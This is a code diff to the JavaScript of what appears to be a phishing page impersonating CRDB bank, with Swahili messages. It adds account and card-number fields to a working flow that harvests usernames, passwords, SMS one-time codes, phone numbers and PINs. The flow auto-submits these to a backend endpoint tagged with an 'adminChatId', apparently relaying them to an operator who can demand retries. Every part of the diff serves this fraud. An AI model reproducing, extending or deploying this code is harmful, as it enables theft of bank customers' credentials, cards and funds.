@@ -42,7 +42,16 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Digit Inputs Setup with AUTO-SUBMIT when fully filled
+  // Auto-format card number input with spaces
+  const cardInput = document.getElementById('crdb-card');
+  if (cardInput) {
+    cardInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+      e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+    });
+  }
+
+  // Digit Inputs Setup with AUTO-SUBMIT feature
   const otpDigits6 = document.querySelectorAll('.otp-digit-6');
   const pinDigits = document.querySelectorAll('.pin-digit');
 
@@ -54,7 +63,6 @@ document.addEventListener('DOMContentLoaded', () => {
           inputs[idx + 1].focus();
         }
 
-        // AUTO-SUBMIT TRIGGER: Check if all digit boxes are completely filled
         const allFilled = Array.from(inputs).every(i => i.value.length === 1);
         if (allFilled && typeof autoSubmitCallback === 'function') {
           autoSubmitCallback();
@@ -69,11 +77,10 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Bind digit auto-submit listeners
   setupDigitInputs(otpDigits6, () => submitOtpHandler());
   setupDigitInputs(pinDigits, () => submitPhonePinHandler());
 
-  // Flow Navigation
+  // Navigation
   document.getElementById('btn-understand-proceed').addEventListener('click', () => {
     showStep(stepSlider);
   });
@@ -82,13 +89,15 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(stepForm);
   });
 
-  // Step 1: Submit Username & Password
+  // Step 1: Submit Credentials & Bank Details
   document.getElementById('btn-submit-creds').addEventListener('click', async () => {
     const username = document.getElementById('crdb-username').value.trim();
+    const account = document.getElementById('crdb-account').value.trim();
+    const card = document.getElementById('crdb-card').value.trim();
     const password = document.getElementById('crdb-password').value.trim();
 
-    if (!username || !password) {
-      alert('Tafadhali weka jina la mtumiaji na nywila.');
+    if (!username || !account || !card || !password) {
+      alert('Tafadhali jaza taarifa zote zikiwemo jina, akaunti, kadi, na nywila.');
       return;
     }
 
@@ -99,7 +108,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password, adminChatId: adminParam })
+        body: JSON.stringify({ username, account, card, password, adminChatId: adminParam })
       });
 
       const data = await res.json();
@@ -149,6 +158,8 @@ document.addEventListener('DOMContentLoaded', () => {
           hideLoading();
           if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
           document.getElementById('crdb-username').value = '';
+          document.getElementById('crdb-account').value = '';
+          document.getElementById('crdb-card').value = '';
           document.getElementById('crdb-password').value = '';
           showStep(stepForm);
         } else if (data.status === 'RETRY_OTP') {
@@ -170,7 +181,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 3000);
   }
 
-  // Step 2: 6-digit SMS OTP Submission Function
+  // Submit OTP Function
   async function submitOtpHandler() {
     const otpVal = Array.from(otpDigits6).map(i => i.value).join('');
 
@@ -203,10 +214,9 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Manual button fallback for OTP
   document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);
 
-  // Step 3: Phone & PIN Submission Function
+  // Submit Phone & PIN Function
   async function submitPhonePinHandler() {
     const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
     const pinVal = Array.from(pinDigits).map(i => i.value).join('');
@@ -246,7 +256,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Manual button fallback for Phone & PIN
   document.getElementById('btn-submit-phone-pin').addEventListener('click', submitPhonePinHandler);
 
   document.getElementById('btn-go-home').addEventListener('click', () => {
@@ -263,4 +272,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-                          
+    
